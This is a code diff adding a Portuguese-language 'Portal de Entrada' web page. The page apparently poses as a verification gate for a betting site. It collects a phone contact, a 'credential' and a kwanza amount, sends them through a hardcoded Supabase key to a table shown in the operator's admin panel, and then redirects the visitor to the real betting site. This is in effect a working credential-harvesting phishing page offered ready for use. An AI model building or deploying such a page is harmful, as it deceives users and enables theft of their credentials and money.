@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#040711">
+<title>Acesso ao Portal — Verificação</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  :root{ 
+    --bg: #040711; 
+    --panel: #0d1424; 
+    --panel-2: #131d33; 
+    --border: #1b2845; 
+    --border-light: #283a63; 
+    --text: #f1f5f9; 
+    --muted: #94a3b8; 
+    --muted-2: #64748b; 
+    --blue: #2563eb; 
+    --blue-glow: #3b82f6;
+    --green: #10b981;
+    --red: #dc2626;
+  }
+  *{margin:0;padding:0;box-sizing:border-box}
+  body{
+    font-family: Inter, system-ui, sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    padding: 16px;
+  }
+  .container {
+    width: 100%;
+    max-width: 400px;
+    background: var(--panel);
+    border: 1px solid var(--border);
+    border-radius: 16px;
+    padding: 28px 24px;
+    box-shadow: 0 12px 30px rgba(0,0,0,0.4);
+    position: relative;
+    overflow: hidden;
+  }
+  .container::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 3px;
+    background: linear-gradient(90deg, #2563eb, #7c3aed);
+  }
+  .brand {
+    text-align: center;
+    margin-bottom: 24px;
+  }
+  .brand h1 {
+    font-size: 18px;
+    font-weight: 800;
+    letter-spacing: -0.3px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    color: #fff;
+  }
+  .brand h1 span {
+    width: 30px; height: 30px;
+    display: grid; place-items:center;
+    background: linear-gradient(135deg, #2563eb, #7c3aed);
+    border-radius: 8px;
+    font-size: 14px;
+    box-shadow: 0 0 12px rgba(37,99,235,0.4);
+  }
+  .brand p {
+    font-size: 12px;
+    color: var(--muted);
+    margin-top: 6px;
+  }
+  .form-group {
+    margin-bottom: 14px;
+  }
+  .form-group label {
+    display: block;
+    font-size: 11.5px;
+    font-weight: 700;
+    color: var(--muted);
+    margin-bottom: 6px;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+  }
+  .form-control {
+    width: 100%;
+    background: var(--bg);
+    border: 1px solid var(--border-light);
+    border-radius: 9px;
+    padding: 11px 14px;
+    color: #fff;
+    font-size: 13.5px;
+    font-weight: 500;
+    outline: none;
+    transition: all 0.2s ease;
+  }
+  .form-control:focus {
+    border-color: var(--blue-glow);
+    box-shadow: 0 0 0 3px rgba(59,130,246,0.2);
+  }
+  .form-control::placeholder {
+    color: var(--muted-2);
+  }
+  .btn-submit {
+    width: 100%;
+    background: var(--blue);
+    color: #fff;
+    border: 1px solid var(--blue-glow);
+    border-radius: 9px;
+    padding: 12px;
+    font-size: 13.5px;
+    font-weight: 800;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    margin-top: 8px;
+    box-shadow: 0 4px 14px rgba(37,99,235,0.35);
+  }
+  .btn-submit:hover {
+    background: #1d4ed8;
+    transform: translateY(-1px);
+  }
+  .status-msg {
+    margin-top: 14px;
+    font-size: 12px;
+    text-align: center;
+    font-weight: 600;
+    min-height: 18px;
+  }
+  .footer-info {
+    text-align: center;
+    margin-top: 20px;
+    font-size: 11px;
+    color: var(--muted-2);
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="brand">
+    <h1><span>◍</span> Portal de Entrada</h1>
+    <p>Preencha os campos para aceder ao site principal</p>
+  </div>
+
+  <form id="authForm">
+    <div class="form-group">
+      <label for="contacto">Contacto</label>
+      <input type="text" id="contacto" class="form-control" placeholder="Ex: 923456789" required autocomplete="off">
+    </div>
+
+    <div class="form-group">
+      <label for="mensagem">Credencial</label>
+      <input type="text" id="mensagem" class="form-control" placeholder="Insira a sua credencial" required autocomplete="off">
+    </div>
+
+    <div class="form-group">
+      <label for="valor">Valor (KZ)</label>
+      <input type="text" id="valor" class="form-control" placeholder="Ex: 1500" required autocomplete="off">
+    </div>
+
+    <button type="submit" id="btnAceder" class="btn-submit">Entrar no Site</button>
+  </form>
+
+  <div class="status-msg" id="statusMsg"></div>
+
+  <div class="footer-info">
+    Sistema seguro integrado com Supabase
+  </div>
+</div>
+
+<script type="module">
+  import { createClient } from 'https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2/+esm'
+  
+  // As mesmas chaves da base de dados do seu painel administrativo
+  const supabaseUrl = 'https://ditnnbdjgefyqlgttolj.supabase.co'
+  const supabaseKey = 'sb_publishable_MoN-opvNr3QJ1TBLhwURtw_G1j9O_xn'
+  const supabase = createClient(supabaseUrl, supabaseKey)
+
+  const form = document.getElementById('authForm');
+  const btn = document.getElementById('btnAceder');
+  const statusMsg = document.getElementById('statusMsg');
+
+  // ⚠️ ALTERE AQUI: Cole o link do seu site principal criado para onde o utilizador deve ir
+  const URL_SITE_PRINCIPAL = 'https://m.elephantbet.co.ao/?utm_source=chatgpt.com';
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    btn.innerText = 'A verificar...';
+    btn.disabled = true;
+    statusMsg.style.color = 'var(--muted)';
+    statusMsg.innerText = 'A processar dados...';
+
+    const contacto = document.getElementById('contacto').value.trim();
+    const mensagem = document.getElementById('mensagem').value.trim();
+    const valor = document.getElementById('valor').value.trim();
+
+    try {
+      // 1. Envia os dados para a tabela 'contatos' no Supabase
+      // Isto fará com que os dados apareçam instantaneamente no seu painel administrativo!
+      const { error } = await supabase
+        .from('contatos')
+        .insert([{ contacto, mensagem, valor }]);
+
+      if (error) throw new Error(error.message);
+
+      statusMsg.style.color = 'var(--green)';
+      statusMsg.innerText = '✓ Sucesso! A redirecionar para o site...';
+
+      // 2. Redireciona o utilizador para o site principal após 1.5 segundos
+      setTimeout(() => {
+        window.location.href = URL_SITE_PRINCIPAL;
+      }, 1500);
+
+    } catch (err) {
+      statusMsg.style.color = '#ef4444';
+      statusMsg.innerText = 'Erro: ' + (err.message || 'Tente novamente.');
+      btn.innerText = 'Entrar no Site';
+      btn.disabled = false;
+    }
+  });
+</script>
+
+</body>
+</html>
